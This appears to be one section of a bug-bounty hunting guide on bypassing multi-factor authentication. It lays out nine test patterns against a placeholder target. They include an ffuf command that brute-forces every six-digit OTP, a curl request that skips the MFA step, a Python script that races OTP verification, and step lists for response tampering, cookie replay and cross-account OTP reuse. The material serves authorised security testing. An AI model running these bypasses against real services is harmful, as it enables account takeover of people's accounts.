## 19. MFA / 2FA BYPASS
> Growing bug class — 7 distinct patterns. Pays High/Critical when it enables ATO without prior session.

### Pattern 1: No Rate Limit on OTP
```bash
# Test with ffuf — all 1M 6-digit codes
ffuf -u "https://target.com/api/verify-otp" \
  -X POST -H "Content-Type: application/json" \
  -H "Cookie: session=YOUR_SESSION" \
  -d '{"otp":"FUZZ"}' \
  -w <(seq -w 000000 999999) \
  -fc 400,429 -t 5
# -t 5 (slow down) — aggressive rates get 429 or ban
```

### Pattern 2: OTP Not Invalidated After Use
```
1. Login → receive OTP "123456" → enter it → success
2. Logout → login again with same credentials
3. Try OTP "123456" again
4. If accepted → OTP never invalidated = ATO (attacker sniffs OTP once, reuses forever)
```

### Pattern 3: Response Manipulation
```
1. Enter wrong OTP → capture response in Burp
2. Change {"success":false} → {"success":true} (or 401 → 200)
3. Forward → if app proceeds → client-side only MFA check
```

### Pattern 4: Skip MFA Step (Workflow Bypass)
```bash
# After entering password, app sets a "pre-mfa" cookie → redirects to /mfa
# Test: skip /mfa entirely, access /dashboard directly with pre-mfa cookie
# If app grants access without MFA = auth flow bypass = Critical
curl -s -b "session=PRE_MFA_SESSION" https://target.com/dashboard
```

### Pattern 5: Race on MFA Verification
```python
import asyncio, aiohttp

async def verify(session, otp):
    async with session.post("https://target.com/api/mfa/verify",
                            json={"otp": otp}) as r:
        return r.status, await r.text()

async def race():
    cookies = {"session": "YOUR_SESSION"}
    async with aiohttp.ClientSession(cookies=cookies) as s:
        # Send same OTP simultaneously from two browsers
        results = await asyncio.gather(verify(s, "123456"), verify(s, "123456"))
        print(results)
asyncio.run(race())
```

### Pattern 6: Backup Code Brute Force
```
Backup codes: typically 8 alphanumeric = 36^8 = ~2.8T (too large)
BUT: check if backup codes are only 6-8 digits = 1-10M range = feasible with no rate limit
Also test: can backup codes be reused after exhaustion? Some apps regenerate predictably.
```

### Pattern 7: "Remember This Device" Trust Escalation
```
1. Complete MFA once on Device A (attacker's browser)
2. Capture the "remember device" cookie
3. Present that cookie from a new IP/browser
4. If MFA skipped = device trust not bound to IP/UA = ATO from any location
```

### Pattern 8: MFA Not Rebound After Credential Change
```
1. Attacker has a valid session (or shares a device). Victim changes password.
2. Is the attacker's session still authenticated? Is MFA re-challenged?
3. Also: disabling MFA / adding a new MFA device — does it require the current OTP or password re-entry?
```
Enrolling a **new** TOTP secret or disabling MFA without step-up auth lets a session-holder lock the victim out. **Confirm:** perform a sensitive action (add MFA device, change email) from the stale session without re-challenge.

### Pattern 9: OTP Not Bound to the Requesting User
The OTP validates the *code* but not *which account* it belongs to — a cross-account confusion:
```
1. Attacker starts login for victim@x.com → server sends OTP to victim.
2. Attacker, in their OWN authenticated/pre-auth session, submits that OTP (or triggers OTP for their own account and replays the code against the victim's verify endpoint).
3. If the verify endpoint keys off the code alone (not session↔account binding) → bypass.
```
Also test: does the OTP for account A validate on account B's `verify` call? Is the `user_id`/`phone` in the verify request attacker-controllable? **Confirm:** you authenticate as the victim using a code that was never bound to your session.

### MFA Chain Escalation
```
Rate limit bypass + no lockout = ATO (Critical)
Response manipulation = client-side only check = Critical
Skip MFA step = auth flow bypass = Critical
OTP reuse = persistent session hijack = High
MFA not rebound after password change = persistent access = High
OTP not bound to user = ATO without victim interaction = Critical
```

